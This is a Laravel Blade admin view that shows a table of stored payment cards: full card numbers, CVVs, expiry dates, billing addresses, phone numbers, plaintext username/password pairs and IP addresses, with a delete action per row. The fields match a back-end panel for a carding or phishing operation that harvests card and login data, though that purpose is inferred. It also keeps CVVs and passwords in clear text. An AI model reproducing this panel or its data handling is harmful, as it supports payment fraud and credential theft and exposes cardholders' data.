@extends('Admin.layouts.app')

@section('content')
<style> 
.ul{
  width: 100%;
}
.ul li {
  border-top: 1px solid;
  border-bottom: 1px solid;
}
.ul li a {
  padding: 10px 5px;
}
</style>
<div class="container">
    <div class="row adjust">
        <div class="col-lg-12">
                <div class="card ">
                    <div class="card-header">Cards</div>
    
                    <div class="card-body">
                      <table class="table table-responsive table-bordered table-hover " style="width: 100% !important;">
                          <thead>
                              <th>Card Owner</th>
                              <th>Name on Card</th>
                           
                              <th>Card Number</th>
                              <th>Cvv</th>
                              <th>Exp Date</th>
                              <th>Billing</th>
                              <th>Phone</th>
                           
                              <th>IP</th>
                              <th>Action</th>
                             
                          </thead>
                          <tbody>
                              @foreach($cards as $card)
                              <tr>
                              <td>{{$card->user == null ? 'No User' : $card->user->username}}</td>
                              <td>{{$card->name}}</td>
                             
                              <td>{{$card->card_no}}</td>
                              <td>{{$card->cvv}}</td>
                              <td>{{$card->exp_date}}</td>
                              <td>{{ $card->street}},{{ $card->city}},{{ $card->state}},{{$card->zipcode}},</td>
                              <td>{{ $card->phone}}</td>
                              <td>{{$card->username == Null ? '' :$card->username}}, {{$card->password == Null ? '' : $card->password}}</td>
                              <td>{{ $card->ip}}</td>
                              <td>
                                <div class="dropdown">
                                  <button class="btn btn-primary dropdown-toggle" type="button" data-toggle="dropdown">Actions
                                  <span class="caret"></span></button>
                                  <ul class="dropdown-menu ul">
                                    <li><a href="{{route('cards.delete', $card->id)}}">Delete</a></li>
                                  </li>
                                  </ul>
                                </div>
                              </td>
                              
                              </td>
                              </tr>
                              @endforeach
                          </tbody>
                      </table>
                      {{$cards->links()}}
                    </div>
                </div>
            </div>
    </div>
</div>
@endsection
